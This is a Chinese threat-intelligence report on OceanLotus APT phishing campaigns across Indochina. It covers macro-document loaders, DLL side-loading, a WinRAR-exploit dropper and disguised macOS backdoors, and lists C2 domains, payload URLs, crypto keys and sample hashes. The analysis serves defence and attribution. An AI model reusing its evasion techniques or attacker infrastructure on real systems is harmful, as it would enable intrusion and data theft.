@@ -1,0 +1,440 @@
+背景及概述
+海莲花（OceanLotus）是一个据称越南背景的 APT 组织。该组织最早于 2015 年 5 月被天眼实验室所揭露并命名，其攻击活动最早可追溯到 2012 年 4 月，攻击目标包括中国海事机构、海域建设部门、科研院所和航运企业，后扩展到几乎所有重要的组织机构，并持续活跃至今。
+而实际上，根据各安全厂商机构对该组织活动的拼图式揭露，海莲花团伙除针对中国发起攻击之外，其攻击所涉及的国家分布非常广泛，包括越南周边国家，如柬埔寨、泰国、老挝等，甚至包括越南的异见人士、媒体、地产公司、外资企业和银行。
+奇安信红雨滴(RedDrip)安全研究团队（前天眼实验室）一直对海莲花团伙的活动保持高强度的跟踪，在近期发现其自 2019 年以来对中南半岛的国家最新的攻击活动中使用的初始投放载荷文件和攻击利用技术，并且结合奇安信威胁情报数据，关联到一系列的攻击事件。
+本报告中我们向安全业界分享对海莲花组织针对越南国内以及越南周边国家最新的攻击利用技术、攻击载荷、及相关攻击事件的分析和总结，希望我们共同增进对海莲花这个极其活跃的 APT 团伙的了解。
+
+针对不同国家的攻击
+以下为我们整理了 2018 年末至今的一些针对中南半岛的部分国家发起攻击的典型案例，其他未提及的样本可参考文末的 IOC 列表。
+
+越南
+压缩包类诱饵
+2019 年 4 月 1 日，红雨滴(ReDrip)安全研究团队在日常监控海莲花的攻击活动过程中，发现了一个越南语的文件名“Hop dong sungroup.rar” 。
+其对应的中文为”大阳城合同”，压缩包内有重命名为 Noi dung chi tiet hop dong sungroup can chinh sua 的 winword.exe，对应的中文为”请参阅详细信息”。
+除此之外，我们还关联到另一个翻译后为”太阳城集团”的压缩包诱饵 SUN_GROUP_CORPORATION 。其压缩包内的文件名如下： Noi dung can xac thuc va sua gui den CONG TY CO PHAN TAP DOAN MAT TROI Bo Tai Chinh.exe 对应中文为”需要进行身份验证和编辑，以便发送给财政部 -  太阳集团合股” COMPANY
+经过查询发现太阳城集团实际上是越南最大的房地产开发商之一。
+而这两个样本均由越南上传。因此我们猜测，海莲花组织在针对太阳城内部员工进行钓鱼攻击。
+除了针对越南房地产业外，我们还发现该组织会针对越南国家银行进行钓鱼攻击：
+相关样本的压缩包名为 CPLH-NHNN-01-2019.rar，样本对应的日期为 2019 年 1 月 22 日，攻击极可能发生在相近的时间段内。
+压缩包名对应的中文为：“越南国家银行-01-2019.rar”；而压缩包中的 winword.exe 被重命名为“ChiPhiLienHoanNHNN-BC2019.exe”，翻译后为：“越南国家银行 SBV-BC 2019.exe” SBV 指的是越南央银越南国家银行(SBV)，而 BC 其实指的是 B2C，即第三方支付。
+该次攻击大概率是针对银行内部员工发起的，类似于伪装成银行内部的第三方支付的文档传输过程。
+除此之外，还有通过杀毒软件相关信息进行伪装的钓鱼。
+压缩包名：“Gui lai cho MS.MAI post content kaspersky.rar”（返回 MS.MAI 发布内容 kaspersky）
+我们看到还会以精油为主题进行钓鱼：
+“Tinh dau can mua”（需要购买精油），压缩包内的 PE 文件名为“有关购买和购买的详细信息”
+
+文档类诱饵
+上述的压缩包带有卡巴斯基名称的诱饵，在诱饵文档方面也同样有类似的命名“Content marketing Kaspersky.doc”，文档打开后显示如下，为越南语版本的诱导点击启用宏的攻击手法。
+除此之外，我们还发现海莲花投放了大量伪装成简历的攻击钓鱼活动，我们内部将其命名为 OceanCV 活动，而该活动直接将海莲花目前常用的 3 种宏攻击手段全部曝光。
+首先，我们先对样本名进行分析，可见样本名均为 CV 开头，命名也具有特点，主要以下 3 种：
+1、CV-人名（如：CV-NguyenQuynhChi.docx）
+2、CV-人名-岗位 （如：CV-AnthonyWei-CustomerService.docx）
+3、CV-随机数字+英文为主 （如：CV-103237-EWQDSD.doc）
+值得注意的是，有的样本在打开后会显示提示需要启用宏的标识：
+但是，当你往下拉一下进度条后，你会发现越南语编写的简历，这在一系列活动中大部分样本均如此，并且简历均不一致。
+而这批简历钓鱼的样本所利用的方式也各不一样。有的使用海莲花 MSO 宏（RedDrip 内部命名 MSOMacro）
+有的使用了模板注入技术：
+有的使用了宏代码转为 1 磅字体隐藏在文档中的技术（后来升级为白色 1 磅字体，RedDrip 内部命名 OHNMacro）
+在以下章节我们会分别详细分析这 3 种宏的利用分析。
+而根据这批简历样本，我们对这 3 种宏文档进行同源样本关联后，结合各种维度，最后发现了大量海莲花专属恶意宏样本，详细可见 Office 样本关联章节。
+
+利用”永恒之蓝”系列漏洞攻击
+我们还发现海莲花会利用“永恒之蓝”系列漏洞针对越南国内向政府提供软件的公司发起攻击。https://www.tandan.com.vn/portal/home/default.aspx 公司为越南的软件公司 TAN DAN JSC。
+该公司会向政府提供邮件服务器，官方公报数据库系统，公民身份管理系统等等。
+在攻击成功后，其会分发木马，我们去年编写的报告《疑似“海莲花”组织早期针对国内高校的攻击活动分析》中利用永恒之蓝攻击高校的木马一致。 https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-university/
+
+利用 WinRAR 漏洞投放伪装成越南浏览器 coccoc 的更新程序进行钓鱼攻击
+传统的利用白加黑机制、宏文档和网站渗透分发恶意 Payload 以外，海莲花也会利用最新的 Winrar 漏洞针对越南发起攻击。以下便是我们捕获的其中一个案例：
+压缩包名称为“TUT_Photoshop_scan_Bank_ID.rar”
+从该样本触发漏洞解压的文件来看，其名称为 CocCocUpated.exe
+COCCOC 是越南一家成立于 2013 年的新兴技术公司，提供在线网络搜索引擎服务和浏览器，主要使用的语言越南语和英语，所提供的搜索服务是越南最成熟的，浏览器是基于谷歌 Chromium 开发而成，支持 Windows、iOS 平台。
+我们通过分析发现，其为海莲花的早期木马框架，我们同样将其放在样本分析一节单独分析。
+当然，除了上面的诱饵，我们还发现海莲花会使用压缩包内嵌 MP4 的方式进行漏洞利用投放，压缩包名称翻译后大致为“ Cho Ray 医院的独家重磅影像”，其中 Cho Ray 指的是越南胡志明市大水镬医院(Chợ Rẫy)，为越南胡志明市最大的综合医院。
+压缩包内有两个 MP4 文件，除了其中一个和压缩包名一致外，还有一个翻译后名称为“独家 在中风新闻发布后，该小组开始配备人员”的视频
+同样，释放的为 CocCocUpdated.exe
+而其分发手段却是通过网盘的方式进行投放。
+在样本分析章节中将对该新木马进行详细分析。
+
+使用独有 MAC 后门并伪装正常程序的攻击
+海莲花除了会在 Windows 平台上针对越南进行攻击外，还会针对 MacOS 平台向越南用户发起攻击，下图几个样本便是近期的投放典型，其使用诸如浏览器更新，Flash 安装更新包，字体安装包，伪装成文档实际为安装程序的手段进行攻击。
+有趣的是，当我们在分析伪装成火狐的样本时，打开后会显示安装 Firefox 的界面，双击 Firefox 这个图标，会执行起来木马：
+同是会弹出假冒的 FireFox 的界面，点击更新，即使断网，也会出现下载进度条，实际上都是伪装的。
+这是攻击者画的假界面：
+同样，在接下来的章节中，我们将这批针对越南的 MacOS 样本进行了扩展分析。
+
+柬埔寨
+下面为今年海莲花针对柬埔寨的最新攻击，文件名为“Report-No.0162(02 Pages).doc”，对应中文名称为：报告 No.0162（02 页）
+样本运行流程如下图所示：
+通过同源关联到的样本如下：
+MD5 文件名 文档创建时间
+56b5a96b8582b32ad50d6b6d9e980ce7 Request Comment on 2019-03-18 04:12:00 UYFC.doc
+3fd2a37c3b8d9eb587c71ceb8e3bb085 No.039714(cdri).doc 2019-03-25 04:33:00
+而关联到的针对柬埔寨攻击的样本 Request Comment on UYFC.doc （请求对 UYFC发表评论）。 UYFC 实际上是柬埔寨青年联合会| UYFC 非政府组织，以此来攻击可能与该会议有关的人员。
+文档截图：
+No.039714(cdri).doc 的文档截图：
+可以明显看出，针对柬埔寨的攻击也采用了 OHN 宏。
+除了利用文档进行攻击之外，去年海莲花还会利用 MacOS 样本针对柬埔寨进行攻击，相关的样本：“Scanned Investment Report-July 2018.zip” （扫描投资报告 -  2018 年 7 月）
+
+泰国
+2019 年以来，海莲花针对泰国发起的典型攻击案例如下
+MD5 文件名 文档创建时间
+4c30e792218d5526f6499d235448bdd9 Form_Provisional Agenda 2019-01-21 02:25:00 of the ASEAN Senior Officials Preparatory Meeting.doc
+d8a5a375da7798be781cf3ea689ae7ab Program Retreat.doc 2019-01-14 03:50:00
+其中名为 Form_Provisional Agenda of the ASEAN Senior Officials Preparatory Meeting.doc 最具有诱饵性，翻译后为”表格 - 东盟高级官员筹备会议的议程.doc”
+而该会议实际上在 2019 年 4 月 6 日在泰国成功举行，从文档的创建时间和上传公网时间来看(2019-03-22)，可以看出海莲花组织在获取时事能力很强，并且筹备周期较长。
+而第二个文档 Program Retreat（计划撤兵），则有可能是针对军事部门，不过由于名称意义广泛，并不能确认攻击者的实际意图。
+并且上表中的 2 个文件的文档内容一样，下图为恢复文档中的 shellcode 字体后的截图：
+其同样采用了 OHN 宏。
+
+样本分析
+“MSO 宏”文档攻击流程
+海莲花”MSO 宏”具有通性，我们对其中一个样本进行分析，可见提取到的宏代码如下：
+首先其会把数据通过 Data 变量相加，然后通过 base64 解密后，解密出 vbs 代码，释放到 msohtml.log，并把 wscript.exe 复制到 windows\SysWOW64\msohtml.exe 中：
+通过复制的 msohtml.exe（就是 wcript.exe）执行 msohtml.log 脚本，如图：
+并创建计划任务：
+msohtml.log 脚本的内容如下，会把 cs 数组里的数据和 518 异或后，执行起来：
+解密后的脚本如图，会把 cs 数组中的元素异或 415 后执行恶意代码：
+解密后的恶意代码如图：会从 https://open.betaoffice.net/cvfemale.png 下载代码并执行。
+
+“OHN 宏”文档攻击流程
+从该样本中提取到宏代码，打开 word 文稿，会提示启用宏，启用宏后会执行这个函数：
+然后会把自身的 office 文档拷贝到 temp 下，命名为随机名，如图：
+然后修改注册表宏的安全性：
+取段落总数的倒数第五段数据（一共 5 段数据，2 个空行，3 个有 hex 数据），从 hex 转成 bin 后，加到新文件的宏代码里面，然后设置 1 秒后执行该宏代码的 x_N0th1ngH3r3 方法：
+该格式文件是 1 磅的文字，肉眼看不到的，如图：
+第一段清除格式之后的数据：
+数据转换成 bin 后，成第二段宏代码，会被第一段宏代码执行 x_N0th1ngH3r3 函数，如图：
+同样的方式执行倒数第 3 段的宏代码，如图：
+也是从这个函数开始：
+取倒数第二段的数据，如图：
+数据如下：
+然后写到内存中执行：
+数据 hex 转成 bin 后是海莲花用的比较多的 shellcode，如图：
+配置文件:
+这种是通过三次宏内存加载 shellcode 的方式主要是为了对抗杀软静态的查杀。
+
+模板注入类文档攻击流程
+海莲花的模板注入类文档具有通用性，在文档启动后，其均会去加载 XXX.XXX/XXX.png 并执行接下来的操作。
+这里举其中一次攻击的例子，fdsw.png 是一个 office 复合文档： (d497bd06b34a046841bb63d3bf20e605)
+提取出来宏，刚开始会通过 SysWOW64\cmd.exe 文件是否存在，判断系统是 32 位或者 64 位：
+根据不同的系统，把文件从 cell 中取出来，经过 base64 解码，落地到：%appdata% \main_background.png:
+然后根据根据不同的操作系统位数选择不同的写注册表的方式，劫持的 CSID 都是 “{2DEA658F-54C1-4227-AF9B-260AB5FC3543}”
+根据这个 CSID，发现劫持的是这个 DLL 的 CSID：%SystemRoot%\System32\PlaySndSrv.dll
+该 dll 是用来播放声音的。
+对 cell 里面 base64 的内容的提取内容如下：
+Base64 解开的其中的一个 32 位的 PE，Dllmain 会申请 0x34aca 字节的内存空间，然后把 0x10012760 处的 shellcode 写入到内存中，通过线程执行起来：
+Shellcode 去 0xfc8 偏移处的指针当参数传到 sub_160018 的函数中：
+而 0xfc8 偏移处的地址放着命令行参数和一个 PE：
+sub_160018 函数的功能主要是在内存中加载后面的 PE，然后把命令行传递过去，根据命令行参数去执行，下图为该 PE 接收命令行参数的代码：
+请求传过来的 URL，把下载后的数据，经过 DES 解密后，在内存中加载起来。
+通过关联分析找到更多的样本：
+根据编译时间排序如下：
+通过表格比较，第一个样本和其他样本的命令行都不一样，可以知道应该是不同次攻击的样本，该样本是带注释的版本，会用相同的方式在内存中加载 shellcode，shellcode 的功能是在内存中加载文件中包含的 PE 文件：
+而文件中包含的 PE 在一个黑客工具包中找到，文件名为： cmd[w7 ][x64].exe；
+该样本的功能是通过文件中包含的 cmd[w7 ][x64].exe 去执行 mcods.exe（这个是海莲花之前用过的白利用程序的 exe 文件名），而 mcods.exe 应该是被前面的 dropper 释放的文件。
+该样本的上传地点是 VN，上传时间是 7 月 31 日，文件名是 msvchr.exe，可以知道这个样本应该是针对越南攻击的：
+通过对这些样本的分析比较可以知道这些样本应该是用来专门在内存中执行 exe 文件，并传递命令行参数的 Loader 程序，是最近半年用到的新的恶意代码框架，专门用来开发对抗静态免杀的。
+发现其中有 2 个样本是 10M 的，是末尾填充 0x20（空格），填充成大文件避免被上传：
+而且这些样本的加载 shellcode 的方式有些不太一样：
+1、大部分样本是通过创建线程执行 shellcode
+2、编译时间最早的那个样本，以服务的形式起来，带注释，在 serviceMain 里创建线程执行 shellcode
+3、少部分样本在主线程直接执行 shellcode
+
+wwlib 白利用样本
+通过亚马逊 AWS 下载的压缩包 CPLH-NHNN-01-2019.rar 分析，发现该压缩包把 winword.exe 白文件和 wwlib.dll 打包到一起投递；
+他们使用 winword.exe 的白利用技术，winword.exe 会默认加载同目录下的 wwlib.dll；
+之所以使用 winword.exe 的白利用技术，因为 winword.exe 的图标是 word 的图标，而且 wwlib.dll 是隐藏的，所以他们只需要把 winword.exe 修改为具有诱惑性的名称，受害者解压后只发现一个 word 图标的 exe，就会打开运行：
+wwlib.dll 的恶意代码再 FMain 导出函数里，winword.exe 打开会默认调用 FMain 这个导出函数，恶意代码就会执行起来；然后 base64 解码出自带的 shellcode，然后在主线程中执行：
+Base64 编码后的 shellcode 存放在样本中的位置：
+发现解码后的 shellcode 和前面的 shellcode 的加载方式是一样的，把 0x6b6 偏移处的数据当参数传递给 sub_16 函数：
+而 sub_16 函数的作用是解密 0x6b6 后面的数据，解密出第二层 shellcode 并执行，下图为解密出的第二层 shellcode：
+第二层 shellcode 通过 DES解密出第三层 shellcode，密钥为“asfahdiuqhu93ye7891h9ubioufcf”：
+第三层 shellcode 的入口和前面 2 个 shellcode 的入口都是一样的，也通过 call/pop 方式找到 shellcode 加载到内存中的位置，然后取代码后面的数据（0x8c6 偏移处）当参数传递到 sub_16 函数中，传递的参数为：https[:]//office.allsafebrowsing.com/AwPT：
+该 shellcode 从 https[:]//office.allsafebrowsing.com/AwPT 下载文件，然后在内存中执行，下图为下载该文件用到的 UA：
+下载回来的 AwPT 文件是 cobaltstrike 的 shellcode 模块：
+下图为解密后面附加数据的算法，和 cobaltstrike 的 shellcode 模块一样，和以往的不同处是偏移往后移动了 8 个字节：
+解密后的数据是一个 beacon 模块，如图：
+提取配置文件信息如下：
+
+MAC 后门
+分析对象为伪装成浏览器的 MAC 后门。
+解压后的文件结构如下，是一个 macOS 的安装包，如图：
+打开后会显示安装 Firefox 的界面，双击 Firefox 这个图标，会执行起来 Dropper 流程：
+会弹出假冒的 FireFox 的界面，点击更新，即使断网，也会出现下载进度条，都是攻击者伪造的：
+这是攻击者画的假界面：
+Dropper 运行起来后会在 Library 目录下创建以下 APP，实现开机启动： /Users/username/Library/LaunchAgents/com.apple.spell.agent.plist
+该 app中的开机启动目录指向该目录：/Users/username/Library/Spelling/的 spellagentd文件，该文件时 OSX 的 bin 文件，代码做了加壳处理，会在内存中解密出 shellcode 并执行，如图：
+执行起来后会回连地址：rio.imbandaad.com，通过 Post 请求把数据包发送到服务器： http://rio.imbandaad.com/v3/yQ/r/eiCu1gd6Qme.js
+但是该地址已经失效。该 App 的签名信息如下： Identifier=org.mozilla.firefox Format=bundle with Mach-O universal (i386 x86_64) CodeDirectory v=20200 size=623 flags=0x0(none) hashes=24+3 location=embedded Hash type=sha1 size=20 CDHash=f1ebdfdfa0c6ab158bc619350c54d3e337a5d849 Signature size=4233 Authority=Developer ID Application: Melinda Cline (P74QRJXB2F) Authority=Developer ID Certification Authority Authority=Apple Root CA Signed Time=Mar 22, 2018, 9:10:20 PM Info.plist entries=24 TeamIdentifier=P74QRJXB2F Sealed Resources version=2 rules=12 files=11 Internal requirements count=1 size=212
+
+CocCocUpdate 分析与关联
+CocCocUpdate 是一个 Dropper，被利用 CVE-2018-20250 漏洞构造的压缩包释放到 startup 目录下，压缩包截图如下：
+重启后会被系统执行起来，对应的文件为 CocCocUpdate.exe，我们在 2015 年曝光过一个通过命令行参数传递随机密钥的 Dropper 版本，这个 CocCocUpdate.exe 改进为通过环境变量传递随机密钥。
+具体的步骤为：
+1、 获取执行起来的 CocCocUpdate.exe 的全路径，存在值为“C091A8C8”的环境变量中，以便后面的程序去读取。
+2、 随机生成 128 字节的密钥，存到值为“DB99050C”的环境变量中；用来加密自身后面的资源数据(shellcode)。
+3、 把通过随机密钥加密 0x40E000 位置处的数据，并把修改后的该 PE 文件写入到 Temp 目录下，然后通过 CreateProcess 执行起来：
+下图为原文件和加密后的文件比较的结果，可以看出代码段没有任何变化，只是 0xd000 的全局变量数组被随机密钥加密了。
+4、 如果该文件被捆绑内容的话，会从资源类型为 10，资源号为 1 的资源中解密释放一个被捆绑的文件（密钥在后 64 字节），比如 Word 文档或者正常文件，然后通过 ShellExectue 执行起来，该文件没有使用释放捆绑的诱饵文件，所以 ID 是错误的：
+5、被执行起来的 temp 进程，会先判断是否有被设置的“C091A8C8”的环境变量，如果有 的话说明是被原始 Dropper 加密起来的，就会从“DB99050C”的环境变量中读取随机生成的 128 位密钥，解密出 0x40e000 处的代码，然后再多解密一层解压一层，因为代码在原始 Dropper 中就是有一层加密和压缩的：
+解压：
+6、解密后的文件是一个 PE 文件，解密后会在内存中执行起来，如图：
+该代码会释放 3 个文件到 c:\program files\microsoft\windows\system restore\ 目录下：
+然后创建服务，指向 rstrui.exe 文件：
+该 rstrui.exe 是攻击者写的一个 loader，伪装微软的 Windows System Restore 图标：
+主要是负责通过 rundll32 加载同目录下的{9FBAA883-1709-4DE3-8C1B-48683F740A5F}.clsid 文件，传递参数也是通过环境变量的方式传递的，这种方法海莲花团伙在 2017 年的时候也常常使用。
+文件名为{9FBAA883-1709-4DE3-8C1B-48683F740A5F}.clsid 的文件时一个 DllLoader，PE 信息如下：
+该 dll 的功能主要是解密并加载同目录下的名字为{9FBAA883-1709-4DE3-8C1B-48683F740A5F}的 shellcode，如图：
+进入 sub_10001480 函数内，会解密出该文件的内容，并在内存中加载该 PE:
+在内存中解密后的 PE 如图：
+DllMain 创建一个线程，执行导出函数 Version，Version 函数里会一直执行远控的函数，失败的话休眠 6s 继续（这里表示休眠 6s 太短了）：
+然后会随机生成一个 4 以内的数字，随机选择 C2，如图：
+其中一个解密 C2 的函数如下：
+回连 4 个域名如下： images.ucange.com preload.ointalt.com maintenance.allidayser.com report.cottallid.com 通过域名关联到的样本的 hash 如下： 2ea902abe453b70cf77e402cc16eb552 cc7b9ee1b026e16a9d37e3988a714479 e60c35dd36c9f525007955e6b3a88b82
+该同源样本中的捆绑文件： cc7b9ee1b026e16a9d37e3988a714479 捆绑的 office 文件内容如下：
+翻译：
+2ea902abe453b70cf77e402cc16eb552 捆绑的 Office 文件内容如下：
+翻译：
+该 Dropper 的流程图如下：
+该版本 Dropper 和 2015 年版本的 Dropper 的比较：
+1、2015 年的 Dropper 是通过命令行参数传递随机生成的解密密钥，而该版本的 Dropper 是通过进程链间的环境变量实现密钥的传递（API 是 SetEnvironmentVariableW 和 GetEnvironmentVariableW）
+2、2015 年版本的存在检测虚拟机，该版本的不存在检测虚拟机。
+下图为：2015 年海莲花的 Dropper 版本通过“—ping”传递密钥：
+下图为：本次 Dropper 的版本把随机生成的密钥存在环境变量中：
+
+关联分析
+木马样本关联
+通过对海莲花的通用后门进行分析，通过其代码中的特征找到了大量同源样本：
+MD5 编译时间 文件大小 模块名
+ac5f18f1c20901472d4708bd06a2d191 2018-06-13,11:33:33 93184 DllHijack.dll
+221e9962c9e7da3646619ccc47338ee8 2018-06-25,02:35:46 93184 DllHijack.dll
+26ea45578e05040deb0cc46ea3103184 2018-07-02,02:11:55 142336 DllHijack.dll
+200033d043c13b88d121f2c1d8d2dfdf 2018-07-09,03:00:10 2053632 DllHijack.dll
+9972111cc944d20c9b315fd56eb3a177 2018-07-13,03:48:03 142336 DllHijack.dll
+bf040c081ad1b051fdf3e8ba458d3a9c 2018-07-23,03:11:16 93184 DllHijack.dll
+6c2a8612c6511df2876bdb124c33d3e1 2018-07-23,04:50:51 93184 DllHijack.dll
+7dace8f91a35766e9c66dd6258552b02 2018-07-23,12:59:23 142336 DllHijack.dll
+c9093362a83b0e7672a161fd9ef9498a 2018-08-07,03:12:39 92672 DllHijack.dll
+38f9655c72474b6c97dc9db9b3609677 2018-08-09,10:11:58 93184 DllHijack.dll
+4bb4d19b42e74bd11459c9358c1a6f01 2018-08-13,02:21:13 168960 DllHijack.dll
+f42611ac0ea2c66d9f27ae14706c1b00 2018-08-13,08:46:56 92672 DllHijack.dll
+c28abdfe45590af0ef5c4e7a96d4b979 2018-08-15,03:20:08 92672 DllHijack.dll
+cf0b74fe79156694a2e3ea81e3bb1f85 2018-08-20,02:12:34 92672 DllHijack.dll
+c78fd680494b505525d706c285d5ebce 2018-08-20,02:23:12 92672 DllHijack.dll
+77390c852addc3581d14acf06991982e 2018-08-29,03:20:46 168960 DllHijack.dll
+49e969a9312ee2ae639002716276073f 2018-08-29,03:50:11 93184 DllHijack.dll
+f5ad93917cd5b119f82b52a0d62f4a93 2018-08-30,08:22:15 129536 DllHijack.dll
+6291eabf6a8c58cad6a04879b7ba229f 2018-09-04,02:24:06 92672 DllHijack.dll
+9a10292157ac3748212fb77769873f6c 2018-09-04,02:42:21 129536 DllHijack.dll
+a406626173132c8bd6fe52672deacbe7 2018-09-06,02:03:30 92672 DllHijack.dll
+93c3d6cffdcb0a2f29844ff130a920be 2018-09-06,08:01:41 129536 DllHijack.dll
+6b8fc8c9fe4f4ef90b2fcbcc0d24cfc9 2018-09-10,02:44:30 119296 DllHijack.dll
+1211dea7b68129d48513662e546c6e21 2018-09-11,03:06:50 92672 DllHijack.dll
+2f1f8142d479a1daf3cbd404c7c22f9f 2018-09-17,04:12:57 111616 DllHijack.dll
+0f877ad5464fcbb12e1c019adf7065cc 2018-09-18,02:24:47 92672 DllHijack.dll
+cab262b84dbd319f3df84f221e5c451f 2018-09-18,03:00:51 111616 DllHijack.dll
+07ff4f943b202f4e16c227679d9b598a 2018-09-19,02:01:04 92672 DllHijack.dll
+7a6ba3e26c86f3366f544f4553c9d00a 2018-09-24,07:12:34 93184 DllHijack.dll
+518f52aabd9a059d181bfe864097091e 2018-09-25,02:59:04 111616 DllHijack.dll
+70a64ae401c0a5f091b5382dea2432df 2018-10-03,04:17:51 111616 DllHijack.dll
+d40b4277e0d417e2e0cff47458ddd62d 2018-10-09,03:22:19 95232 DllHijack.dll
+5f1bc795aa784f781d91acc97bec6644 2018-10-17,08:02:50 209412 DllHijack.dll
+305d992821740a9cbbda9b3a2b50a67c 2018-10-22,03:27:24 92672 DllHijack.dll
+7df61bc3a146fcf56fe1bbd3c26ea8c0 2018-10-22,03:34:11 113664 DllHijack.dll
+3c04352c5230b8cbaa12f262dc01d335 2018-11-14,07:07:53 92672 DllHijack.dll
+41f717eda9bc37de6ea584597f60521f 2018-11-15,02:03:44 92672 DllHijack.dll
+db81a7e405822be63634001ec0503620 2018-11-28,08:55:24 112128 DllHijack.dll
+865a7e3cd87b5bc5feec9d61313f2944 2018-11-29,02:21:27 92672 DllHijack.dll
+aad445e7ffc5ce463996e5db13350c5b 2018-11-29,08:18:42 115712 DllHijack.dll
+9bcd0b2590c53e4c0ed5614b127c6ba7 2018-11-29,09:25:15 112128 DllHijack.dll
+7338852de96796d7f733123f04dd1ae9 2018-12-04,02:27:26 92672 DllHijack.dll
+906a6898d099eb50c570a4014c1760f5 2018-12-04,04:31:45 115712 DllHijack.dll
+a530410bca453c93b65d0de465c428e4 2018-12-06,03:21:22 115712 DllHijack.dll
+de409b2fe935ca61066908a92e80be29 2018-12-10,04:03:20 115712 DllHijack.dll
+2756b2f6ba5bcf811c8baced5e98b79f 2018-12-10,04:29:12 92672 DllHijack.dll
+
+MAC 后门关联
+通过在上一章中对 MAC 样本回连的 C2：rio.imbandaad.com 进行域名反查后，我们发现解析 IP 为 198.15.119.125。当再次对该 IP 进行 IP 反查后，我们发现其中一个域名 web.dalalepredaa.com 域名已经打上了海莲花的标签
+而通过该域名，我们发现了一个海莲花的最新 MAC 样本。
+首先，该样本为了伪装成文档，将文件夹名字中的 docx 中的 d，改为小写罗马数字五百，从而欺骗用户：Don khieu nai.ⅾocx
+Windows 系统下看是这样的：
+Macosx 系统上看是 office 图标的 docx 文件，其实是目录：
+因为 Info.plist 中的 iconFile 指向了一个 doc 的图标文件，如图：
+以下为该样本的签名信息，如图： Identifier=com.apple.files Format=bundle with Mach-O thin (x86_64) CodeDirectory v=20200 size=439 flags=0x0(none) hashes=15+3 location=embedded Hash type=sha1 size=20 CDHash=80f54c13237d538cd3d885062e11c306b01d858f Signature size=8522 Authority=Developer ID Application: DAVID DOWELL (B5YH6VDVRE) Authority=Developer ID Certification Authority Authority=Apple Root CA Timestamp=Sep 19, 2018, 3:57:09 AM Info.plist entries=11 TeamIdentifier=B5YH6VDVRE Sealed Resources version=2 rules=12 files=2 Internal requirements count=1 size=208
+样本执行起来后，会在 Library 目录中创建 3 个目录： LaunchAgents Media Video
+并安装一个名字为 LaunchAgents 的应用，实现开机启动：
+该应用的程序指向 Video 目录下的 mediaagentd 程序：
+同时之前的目录被替换成真的 docx 文件，实现偷梁换柱：
+而释放的 mediaagentd 程序是加壳的，会解密后在内存中加载并执行：
+脱壳后的 MACOS 文件如下：
+该文件的入口处，会有一个 while 死循环，执行收集电脑信息并发送后，进入远控的循环函数，会随机睡眠一段时间，并继续走重复的流程：
+内部的很多字符串都被加密了，下图为使用该加密函数的地方：
+解密方法主要是通过 CCCrypt 解密，算法为 aes，iv 为 0，如图：
+AES 密钥（HEX）为：4E620ABEDAFB4D9866CC9D9C2D29E2D7EA18ADF1 不够 32 位补零：
+解密的所有字符串如下：
+而且会把收集的信息经过 AES 加密后通过 CURL 库发送出去：
+远控的消息分发函数如下：会根据第一自己的 token 执行不同的操作，下图为列目录的操作：
+传输数据用的密钥和解密字符串的密钥不一样，下图为传输数据的加密密钥： 07E74FF2CE9688C8F79B91AB32C95D11C140D3AC
+加密后的数据发送到 C2，如图： C2: web.dalalepredaa.com
+值得注意的是，我们发现海莲花近期的 Mac 样本中有的会带有签名，去重后我们发现常用的为两个： Melinda Cline (P74QRJXB2F) DAVID DOWELL (B5YH6VDVRE)
+
+Office 样本关联
+经过关联分析发现，该宏文档样本与大量样本存在同源情况。
+下图为其中比对案例，可以看出，文档的创建内容的时间相同，并且作者同样相同。
+下图为模板特征，模板文件名极具海莲花特色。
+经过分析发现，我们总结了海莲花的攻击文档中常用的作者名，其中最大规模的攻击活动为“DEV”活动和” Tushar”活动。
+通过对各类维度进行关联分析后，可以得到在这一系列恶意宏文档投放活动中涉及的文档名和 Hash 值。
+文档名 MD5
+test.doc 5c9ef8b5263651a08ea1b79057a5ee28
+Scan_Mau_Ao_Thun.doc b858c08cf7807e462ca335233bd83fe7
+Content marketing Kaspersky.doc c313f8a5fd8ca391fc85193bc879ab02
+doc.doc 473fdfefa92725099ca87e992edbc92c
+LÝ_ANH_TRUNG_CV.doc 02cec2f17a7910b6fa994f340bbbc297
+LÝ ANH TRUNG CV.doc dd5ae0c0a7e17d101f570812fec4e5e4
+LÝ_ANH_TRUNG_CV.doc 90e5ff68bf06cb930ed8c040139c4650
+LÝ_ANH_TRUNG_CV.doc 6db450c4c756071ecafff425d6183d7d
+CV-DucNguyenMinh.doc cb39e2138af92c32e53c97c0aa590d48
+CV Nguyen Minh Duc.docx 8e13895504e643cd8e0e87377b25bd6b
+Danh sach can bo vi pham.doc d3c27f779d615a1d3a35dff5e9561eb0
+Danh Sach Nhan Vien Bien Thu Tien Cong Ty.docx 27425360d18feea54860420006ea9833
+Danh Sach Nhan Vien Bien Thu Tien Cong Ty.docx cf0142da12509f544a59093495c3a6dd
+CV-AnthonyWei-CustomerService.docx b1df440e5dd64ffae9f7e792993f2f4c
+878fa022bd5e5caf678fe8d728ce42ee
+f78be074f6bc67a712e751254df5f166
+Ho Chi Minh.docx e2aed850c18449a43886fc79b342132f
+DS-Card-ChienThang-TraVinh.docx 74b456adf2ae708789fb2d34ecccb954
+HopDong-XXX-TP-092018.docx 72263750df84e24fe645206a51772c88
+BBLV_ASC_DG_092018.docx 3a574c28beca4f3c94d30e3cf3979f4c
+indo.docx ee836e0f7a40571523bf56dba59898f6
+Danh sách các nhà đấu tranh bị bắt 2.9.doc f6068b672a19ce14981df011a55081e4
+1 00ac0d7337290b74bdd7f43ec4a67ddb
+针对这批样本的诱饵名称进行分析后，各有特色
+1、名称具有政治特色：被捕活动人士名单
+2、包括一些利用简历去进行钓鱼攻击活动
+可以关联到@vupt_bka 安全研究员分析的一封海莲花使用简历钓鱼的邮件。 https://twitter.com/vupt_bka/status/1083653486963638275
+3、还有一些显示诱导宏启动的文档，与以往的诱导界面不一致。
+并且历史样本和最新样本技术方面同样存在不同，如下所示，某些历史样本并没有使用模板注入技术，而是使用的直接宏代码执行方法，并将要执行的代码显示在文档内容中，也就是样本分析一节中提到的 OHN 宏代码。
+上述这类宏样本在经过关联分析后，可以发现该类攻击最早是在 2017 年，越南上传的诱饵文档，从文件名看，很大概率是测试样本。 SAMPLES 08_11__12_2017 (317) c4d35f3263fef4a533e7403682a034c3
+4、出现频率最高的越南语文档保护诱饵系列
+
+压缩包类诱饵关联
+在对海莲花的一个 Thu moi 2019.rar 样本进行分析的过程中，我们发现该样本的生成时间疑似存在自定义的嫌疑
+因为从样本的上传时间来看，其上传至 VT 的时间为 2019 年 3 月 1 日，而压缩包内的时间差距过大。
